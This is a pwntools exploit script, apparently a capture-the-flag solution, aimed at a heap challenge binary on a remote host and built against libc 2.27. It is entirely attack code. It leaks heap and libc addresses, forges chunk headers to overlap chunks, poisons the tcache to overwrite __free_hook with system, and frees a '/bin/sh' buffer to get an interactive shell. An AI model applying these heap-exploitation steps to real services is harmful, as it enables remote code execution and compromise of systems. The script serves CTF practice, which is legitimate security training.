from pwn import *

if args.LOCAL:
    io=process('./chall_patched')
    if args.GDB:
        cmd="""
        init-pwndbg
        """
        gdb.attach(io, cmd)
else: 
    io=remote('mc.ax', 32526)
    #io=remote('0', 1337)
libc=ELF('./libc-2.27.so')
elf=ELF('./chall_patched')

def str_(size, ll):
    io.sendlineafter(b'> ', b'1')
    io.sendafter(b'size? ', str(size).encode())
    if size:
        sleep(0.1)
        io.send(ll)
    
def tok(idx, delim):
    io.sendlineafter(b'> ', b'2')
    io.sendafter(b'idx? ', str(idx).encode())
    io.sendafter(b'delim? ', delim)
    
def del_(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendafter(b'idx? ', str(idx).encode())
    
def exit_():
    io.sendlineafter(b'> ', b'4')

for i in range(2):
    str_(0, b'aa')

del_(0)
del_(1)

str_(0, b'a')
tok(0, b'\0')
heap = u64(io.recv(6)+b'\0\0') -  0x260
del_(0)
print(hex(heap))

str_(0x4f8, b'A')
str_(0x20, b'A')
del_(0)
str_(0x4f8, b'\x60')
tok(0, b'\0')
libc.address = u64(io.recv(6)+b'\0\0') - 0x3ebc60
print(hex(libc.address))
# del_(0)

str_(0x38, p64(0)+p64(0x60)+p64(heap+0x7d0)*2) # 2
str_(0x28, b'A'*0x28) # 3
str_(0xf8, b'B') # 4
tok(3, b'\x01')
del_(3)
str_(0x28, b'A'*0x20+p64(0x60)) # 3

for i in range(7):
    str_(0xf8, str(i).encode()) # 5 -> 12
str_(0x68, b'C') # 13
for i in range(7):
    del_(i+5)
    
del_(4) 
str_(0x158, b'test') 
del_(4)
del_(3)
str_(0x158, b'test'*10+p64(0x30)+p64(libc.sym.__free_hook)) 
str_(0x28, b'a') 
str_(0x28, p64(libc.sym.system))  
str_(0x100, b'/bin/sh')
del_(6)

io.interactive()

